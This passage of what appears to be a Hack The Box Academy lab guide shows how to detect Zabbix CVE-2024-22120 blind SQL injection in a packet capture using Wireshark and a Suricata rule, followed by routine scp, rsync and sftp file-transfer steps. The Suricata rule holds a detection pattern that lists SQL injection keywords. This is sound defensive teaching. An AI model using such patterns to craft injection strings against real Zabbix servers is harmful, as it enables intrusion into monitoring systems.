** (wireshark:<span class="hljs-number">241328</span>) <span class="hljs-number">03</span>:<span class="hljs-number">08</span>:<span class="hljs-number">35.841875</span> [GUI WARNING] -- QStandardPaths: XDG_RUNTIME_DIR <span class="hljs-keyword">not</span> <span class="hljs-keyword">set</span>, defaulting <span class="hljs-keyword">to</span> <span class="hljs-string">'/tmp/runtime-htb-ac-871408'</span>
 ** (wireshark:<span class="hljs-number">241328</span>) <span class="hljs-number">03</span>:<span class="hljs-number">08</span>:<span class="hljs-number">35.875771</span> [GUI WARNING] -- QStandardPaths: XDG_RUNTIME_DIR <span class="hljs-keyword">not</span> <span class="hljs-keyword">set</span>, defaulting <span class="hljs-keyword">to</span> <span class="hljs-string">'/tmp/runtime-htb-ac-871408'</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/257/forpurple1.png" alt="Terminal showing SCP command to transfer a pcap file and Wireshark opening tcp\_dump\_2024-11-19-08:39:47.pcap with network traffic details."></p>
<p>As mentioned earlier, the exploit script uses the Zabbix sender protocol to send its malicious requests. Therefore, any malicious artifacts of the attack within the traffic capture can be identified in TCP traffic rather than plain HTTP.</p>
<p>TCP traffic can be isolated using the following filter:</p>
<p>Code: wireshark</p>
<pre><code class="lang-wireshark"><span class="hljs-attribute">tcp</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/257/forpurple2.png" alt="Wireshark displaying TCP packet details between IPs 10.10.14.80 and 10.129.231.23, highlighting frame 88 with payload data."></p>
<p>By examining the packets, we notice SQL queries that match the format used by the exploit script mentioned earlier.</p>
<p>We can right-click on the suspicious packet containing an SQL query matching the exploit script&#39;s format and choose <code>Follow</code> &gt; <code>TCP Stream</code> from the context menu. This will display the entire SQL query in the request, making it more visible and easier to analyze.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/forpurple3.png" alt="Wireshark showing TCP stream between 10.10.14.80 and 10.129.231.23, highlighting frame 88 with payload data and a command response indicating traceroute not found."></p>
<p><strong>Inspecting TCP Traffic With Suricata</strong></p>
<p>Instead of manually going through packets in <code>Wireshark</code>, we could also utilize the following <code>Suricata</code> rule to search for attack artifacts in the traffic.</p>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">alert tcp any any -&gt; <span class="hljs-variable">$HOME_NET</span> any (msg:<span class="hljs-string">"ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-2024-22120)"</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">"ZBXD|01|"</span>; fast_pattern; startswith; <span class="hljs-attribute">content</span>:<span class="hljs-string">"|22|clientip|22 3a|"</span>; pcre:<span class="hljs-string">"/^[^\x2c]*(?:(?:S(?:HOW\x20(?:C(?:UR(?:DAT|TIM)E|HARACTER\x20SET)|(?:VARI|T)ABLES)|ELECT\x20(?:FROM|USER))|U(?:NION\x20SELEC|PDATE\x20SE)T|DELETE\x20FROM|INSERT\x20INTO)|S(?:HOW.+(?:C(?:HARACTER.+SET|UR(DATE|TIME))|(?:VARI|T)ABLES)|ELECT.+(?:FROM|USER))|U(?:NION.+SELEC|PDATE.+SE)T|DELETE.+FROM|INSERT.+INTO|\x2f\*.+\*\x2f)?/Ri"</span>; reference:url,support.zabbix.com/browse/ZBX-<span class="hljs-number">24505</span>; reference:cve,<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>; classtype:web-application-attack; sid:<span class="hljs-number">2055989</span>; rev:<span class="hljs-number">1</span>; metadata:affected_product Zabbix, attack_target Server, tls_state plaintext, created_at <span class="hljs-number">2024</span>_09_19, cve CVE_2024_22120, deployment Perimeter, deployment Internal, performance_impact Moderate, confidence High, signature_severity Major, tag Exploit, updated_at <span class="hljs-number">2024</span>_09_19, mitre_tactic_id TA0001, mitre_tactic_name Initial_Access, mitre_technique_id T1190, mitre_technique_name Exploit_Public_Facing_Application; target:dest_ip;)
</code></pre>
<p>Heres how we can do it:</p>
<ol>
<li>Connect to the Linux Purple Module target (Zabbix host) via SSH after the attack part has concluded.</li>
<li>Create a file named <code>suricata.rules</code> in the <code>/root</code> directory and insert the aforementioned Suricata rule inside it.</li>
<li>Execute <code>Suricata</code> as follows from inside the <code>/tmp</code> directory to identify if the captured traffic contains <code>CVE-2024-22120</code> exploitation artifacts.</li>
</ol>
<p>&#x20; Usage Example: Zabbix CVE-2024-22120</p>
<pre><code class="lang-shell-session">root@ubuntu:/tmp# suricata -r /tmp/tcp_dump_2024-<span class="hljs-number">11</span>-<span class="hljs-number">28</span>-<span class="hljs-number">11</span>\:<span class="hljs-number">19</span>\:<span class="hljs-number">10</span>.pcap -s /root/suricata.rules
i: suricata: This is Suricata version <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5</span> RELEASE running in USER mode
W: detect: No rule files match the pattern /var/lib/suricata/rules/suricata.rules
i: threads: Threads created -&gt; RX: <span class="hljs-number">1</span> W: <span class="hljs-number">2</span> FM: <span class="hljs-number">1</span> FR: <span class="hljs-number">1</span>   Engine started.
i: suricata: Signal Received.  Stopping engine.
i: pcap: read <span class="hljs-number">1</span> file, <span class="hljs-number">29787</span> packets, <span class="hljs-number">7542384</span> bytes
root@ubuntu:/tmp# cat fast.log 
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">52</span>.<span class="hljs-number">942430</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:39492</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">05</span>.<span class="hljs-number">386433</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:37726</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">09</span>.<span class="hljs-number">980631</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:37770</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">11</span>.<span class="hljs-number">126284</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:37772</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">14</span>.<span class="hljs-number">570416</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:50864</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">15</span>.<span class="hljs-number">718785</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:50868</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">03</span>.<span class="hljs-number">092362</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:37704</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">25</span>.<span class="hljs-number">864055</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:35964</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">04</span>.<span class="hljs-number">238361</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:37716</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">06</span>.<span class="hljs-number">534337</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:37732</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">38</span>.<span class="hljs-number">302902</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:47614</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">07</span>.<span class="hljs-number">685975</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:37744</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
<span class="hljs-number">11</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>-<span class="hljs-number">11</span>:<span class="hljs-number">23</span>:<span class="hljs-number">08</span>.<span class="hljs-number">832344</span>  <span class="hljs-string">[**]</span> <span class="hljs-string">[1:2055989:1]</span> ET WEB_SPECIFIC_APPS Zabbix Server Blind SQL Injection via clientip Parameter (CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">22120</span>) <span class="hljs-string">[**]</span> <span class="hljs-string">[Classification: Web Application Attack]</span> <span class="hljs-string">[Priority: 1]</span> {TCP} <span class="hljs-number">10.10.14.95:37756</span> -&gt; <span class="hljs-number">10.129.231.23:10051</span>
&lt;SNIP&gt;
</code></pre>
<p>The rule was triggered multiple times, as the <code>.pcap</code> file contains traffic that matches the pattern the Suricata rule is designed to detect, specifically related to the blind SQL injection vulnerability in Zabbix.</p>
<hr>
<p>This is just the tip of the iceberg in terms of the possible detection avenues one can pursue by leveraging the built-in logging capabilities and the DFIR toolset of Linux Purple Module targets. Feel free to experiment and identify your own investigation avenues.</p>
<hr>
<h2 id="transferring-files-to-and-from-purple-module-targets">Transferring Files to and from Purple Module Targets</h2>
<p>This section explains the process of transferring files between a workstation and the Purple Module targets, enabling the execution of the use cases described in the module&#39;s &quot;Introduction&quot; section.</p>
<p>It is assumed that <code>Pwnbox</code> is being used as the workstation. Pwnbox is pre-configured to operate on the same VPN network as the Purple Module targets, enabling seamless communication without additional setup.</p>
<p>For workstations other than Pwnbox, connecting to the Hack The Box Academy VPN is necessary to establish communication with the Purple Module targets. Refer to the relevant guide for the appropriate platform:</p>
<ul>
<li><a href="https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn">HTB Academy VPN Connection Guide</a>  for users accessing HTB Academy</li>
<li><a href="https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access">HTB Enterprise VPN Connection Guide</a>  for users accessing HTB Enterprise</li>
</ul>
<h3 id="file-transfers-on-windows-purple-module-targets">File Transfers on Windows Purple Module Targets</h3>
<p>When interacting with Windows Purple Module targets, several tools and techniques can facilitate file transfers between Pwnbox and the targets, such as SSH, RDP, and others. Since all Windows Purple Module targets have an SSH server pre-installed, the <code>scp</code> (Secure Copy) utility is a practical and reliable method for transferring files.</p>
<p><strong>Using SCP (Secure Copy)</strong></p>
<p><code>SCP</code> is a widely used command-line tool for secure file transfer over SSH. It allows copying files or directories between local and remote systems, maintaining simplicity and security.</p>
<p><strong>Transferring Files from Pwnbox to a Windows Purple Module Target</strong></p>
<p>To copy files from Pwnbox to a Windows Purple Module target, the following <code>scp</code> command can be used:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp <span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/local/</span>file username@<span class="hljs-params">&lt;Target_IP&gt;</span>:<span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/remote/</span>destination
</code></pre>
<p>An example of the command execution can be seen below:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp /home/htb-ac<span class="hljs-number">-871408</span>/data/file1.txt administrator@<span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.10</span>:C:/Users/Administrator/Desktop

The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-comment">'10.129.232.10 (10.129.232.10)' can't be established.</span>
ED25519 <span class="hljs-keyword">key</span> fingerprint <span class="hljs-keyword">is</span> SHA256:<span class="hljs-number">9</span>avrzlcxgO/<span class="hljs-number">6</span>dQndFnNFSqthwXMuBkaJCPOkWt3vkes.
This <span class="hljs-keyword">key</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> known <span class="hljs-keyword">by</span> any other names.
Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes
Warning: Permanently added <span class="hljs-comment">'10.129.232.10' (ED25519) to the list of known hosts.</span>
administrator@<span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.10</span><span class="hljs-comment">'s password: </span>
file1.txt                                                                                                                     <span class="hljs-number">100</span>%   <span class="hljs-number">13</span>     <span class="hljs-number">0.1</span>KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span>
</code></pre>
<p>The file <code>file1.txt</code> is successfully transferred to the <code>Desktop</code> directory of the <code>Administrator</code> user on the Windows Purple Module target.</p>
<p><strong>Transferring Files from a Windows Purple Module Target to Pwnbox</strong></p>
<p>To copy files from a Windows Purple Module target back to Pwnbox, the following <code>scp</code> command can be used:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp username@<span class="hljs-params">&lt;Target_IP&gt;</span>:<span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/remote/</span>file <span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/local/</span>destination
</code></pre>
<p>An example of the command execution can be seen below:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp administrator@<span class="hljs-number">10.129</span><span class="hljs-meta">.232</span><span class="hljs-meta">.10</span>:C:/Users/Administrator/Desktop/file2.txt /home/htb-ac-<span class="hljs-number">871408</span>/data/
administrator@<span class="hljs-number">10.129</span><span class="hljs-meta">.232</span><span class="hljs-meta">.10</span><span class="hljs-string">'s password: 
file2.txt                                                                                                                     100%   13     0.0KB/s   00:00</span>
</code></pre>
<p>In this example, the file <code>file2.txt</code> is successfully transferred from the <code>Desktop</code> directory of the <code>Administrator</code> user on the Windows Purple Module target to the <code>/home/htb-ac-871408/data/</code> directory on Pwnbox.</p>
<hr>
<h3 id="file-transfers-on-linux-purple-module-targets">File Transfers on Linux Purple Module Targets</h3>
<p>File transfers on Linux Purple Module targets can be efficiently achieved using tools such as <code>scp</code>, <code>rsync</code>, and <code>sftp</code>. These tools facilitate secure file exchange between Pwnbox and the Linux target systems.</p>
<p><strong>Using SCP (Secure Copy)</strong></p>
<p><strong>Transfer Files from Pwnbox to a Linux Purple Module Target</strong></p>
<p>To transfer a file from Pwnbox to a Linux Purple Module target, the following <code>scp</code> command can be used:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp <span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/local/</span>file username@<span class="hljs-params">&lt;Target_IP&gt;</span>:<span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/remote/</span>destination
</code></pre>
<p>An example of the command execution can be seen below:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ scp /home/htb-ac-<span class="hljs-number">871408</span>/data/file.txt root@<span class="hljs-number">10.129.231.23</span>:/root/data
root@<span class="hljs-number">10.129.231.23</span>'s password: 
Permission denied, please try again.
root@<span class="hljs-number">10.129.231.23</span>'s password: 
file.txt                                      <span class="hljs-number">100</span>%   <span class="hljs-number">13</span>     <span class="hljs-number">0</span>.1KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span>
</code></pre>
<p>This command transfers the <code>file.txt</code> file from the local directory <code>/home/htb-ac-871408/data</code> on Pwnbox to the remote directory <code>/root/data</code> on the Linux Purple Module target.</p>
<p><strong>Transferring Files from a Linux Purple Module Target to Pwnbox</strong></p>
<p>To copy files from a Linux Purple Module target to Pwnbox, the following <code>scp</code> command can be used:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp username@<span class="hljs-params">&lt;Target_IP&gt;</span>:<span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/remote/</span>file <span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/local/</span>destination
</code></pre>
<p>An example of the command execution can be seen below:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp root@10.129.231.23:/tmp/tcp_dump_2024<span class="hljs-string">-11</span><span class="hljs-string">-22</span><span class="hljs-string">-07</span>:04:48.pcap /home/htb-ac<span class="hljs-string">-871408</span>/data
root@10.129.231.23's password: 
tcp_dump_2024<span class="hljs-string">-11</span><span class="hljs-string">-22</span><span class="hljs-string">-07</span>:04:48.pcap             100%  683KB 269.6KB/s   00:02
</code></pre>
<p>This command transfers the <code>tcp_dump_2024-11-22-07:04:48.pcap</code> file from the remote directory <code>/tmp</code> on the Linux Purple module target to the local directory <code>/home/htb-ac-871408/data</code> on Pwnbox.</p>
<hr>
<p><strong>Using RSYNC (Remote Sync)</strong></p>
<p><code>rsync</code> is an efficient tool for transferring and synchronizing files. It is especially useful for transferring large files or directories and supports resuming interrupted transfers.</p>
<p><strong>Transferring Files from Pwnbox to a Linux Purple Module Target</strong></p>
<p>To transfer files or directories using rsync, the following command can be used:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ rsync -avz <span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/local/</span>file username@<span class="hljs-params">&lt;Target_IP&gt;</span>:<span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/remote/</span>destination
</code></pre>
<p>An example of the command execution can be seen below:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ rsync -avz /home/htb-ac<span class="hljs-number">-871408</span>/data/<span class="hljs-built_in">file</span>.txt root@<span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.23</span>:/root/data
root@<span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.23</span>'s password: 
sending incremental <span class="hljs-built_in">file</span> <span class="hljs-built_in">list</span>
file1.txt

sent <span class="hljs-number">143</span> bytes  received <span class="hljs-number">35</span> bytes  <span class="hljs-number">16.95</span> bytes/sec
total size <span class="hljs-keyword">is</span> <span class="hljs-number">13</span>  speedup <span class="hljs-keyword">is</span> <span class="hljs-number">0.07</span>
</code></pre>
<p>This command synchronizes the file <code>file.txt</code> from the local directory <code>/home/htb-ac-871408/data</code> on Pwnbox to the remote directory <code>/root/data</code> on the Linux Purple Module target.</p>
<p><strong>Transferring Files from a Linux Purpe Module Target to Pwnbox</strong></p>
<p>To retrieve files from a Linux Purple Module target to Pwnbox, the following rsync command can be used:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ rsync -avz username@<span class="hljs-params">&lt;Target_IP&gt;</span>:<span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/remote/</span>file <span class="hljs-meta-keyword">/path/</span>to<span class="hljs-meta-keyword">/local/</span>destination
</code></pre>
<p>An example of the command execution can be seen below:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session"><span class="hljs-type">root</span>@htb[/htb]$ rsync -avz root@<span class="hljs-number">10.129</span>.<span class="hljs-number">231.23</span>:/root/data/file2.txt /home/htb-ac-<span class="hljs-number">871408</span>/data
root@<span class="hljs-number">10.129</span>.<span class="hljs-number">231.23</span><span class="hljs-symbol">'s</span> password: 
receiving incremental file <span class="hljs-built_in">list</span>
file2.txt

sent <span class="hljs-number">43</span> <span class="hljs-built_in">bytes</span>  received <span class="hljs-number">123</span> <span class="hljs-built_in">bytes</span>  <span class="hljs-number">19.53</span> <span class="hljs-built_in">bytes</span>/sec
total size is <span class="hljs-number">13</span>  speedup is <span class="hljs-number">0.08</span>
</code></pre>
<p>This command retrieves the <code>file2.txt</code> file from the remote directory <code>/root/data</code> on the Linux Purple module target to the local directory <code>/home/htb-ac-871408/data</code> on Pwnbox.</p>
<p><strong>Using SFTP (Secure File Transfer Protocol)</strong></p>
<p><code>sftp</code> provides an interactive interface for secure file transfers and is useful for browsing remote file systems or transferring files when paths are not well-defined.</p>
<p><strong>Connecting to a Linux Purple Module Target</strong></p>
<p>To initiate an <code>SFTP</code> session with a Linux Purple Module target, the following command can be used:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sftp username@&lt;Target_IP&gt;
</code></pre>
<p>An example of the command execution can be seen below:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sftp root@<span class="hljs-number">10.129.231.23</span>
root@<span class="hljs-number">10.129.231.23</span>'s password: 
Connected to <span class="hljs-number">10.129.231.23</span>.
sftp&gt;
</code></pre>
<p>Once connected, the following commands can be used for file transfers:</p>
<ul>
<li><p>Upload a file to the Linux Purple module target:</p>
<p>&#x20;&#x20;</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">put</span> /path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">local</span>/<span class="hljs-built_in">file</span> /path/<span class="hljs-keyword">to</span>/remote/destination
</code></pre>
</li>
<li><p>Download a file from the Linux Purple module target:</p>
<p>&#x20;&#x20;</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">get</span> /path/<span class="hljs-keyword">to</span>/remote/<span class="hljs-built_in">file</span> /path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">local</span>/destination
</code></pre>
</li>
</ul>
<p>Examples of command execution can be seen below:</p>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sftp&gt; put /</span>home<span class="hljs-regexp">/htb-ac-871408/</span>data<span class="hljs-regexp">/file1.txt /</span>root<span class="hljs-regexp">/data/</span>
    Uploading <span class="hljs-regexp">/home/</span>htb-ac<span class="hljs-number">-871408</span><span class="hljs-regexp">/data/</span>file1.txt to <span class="hljs-regexp">/root/</span>data/file1.txt
    file1.txt                                                               <span class="hljs-number">100</span>%   <span class="hljs-number">13</span>     <span class="hljs-number">0.1</span>KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span>
</code></pre>
<p>&#x20; Transferring Files to and from Purple Module Targets</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sftp&gt; get /root/<span class="hljs-keyword">data</span>/<span class="hljs-keyword">target</span>.txt /home/htb-ac-<span class="hljs-number">871408</span>/<span class="hljs-keyword">data</span>/
    Fetching /root/<span class="hljs-keyword">data</span>/<span class="hljs-keyword">target</span>.txt to /home/htb-ac-<span class="hljs-number">871408</span>/<span class="hljs-keyword">data</span>/<span class="hljs-keyword">target</span>.txt
    <span class="hljs-keyword">target</span>.txt                                                              <span class="hljs-number">100</span>%    <span class="hljs-number">5</span>     <span class="hljs-number">0.</span>KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span>
</code></pre>
<hr>
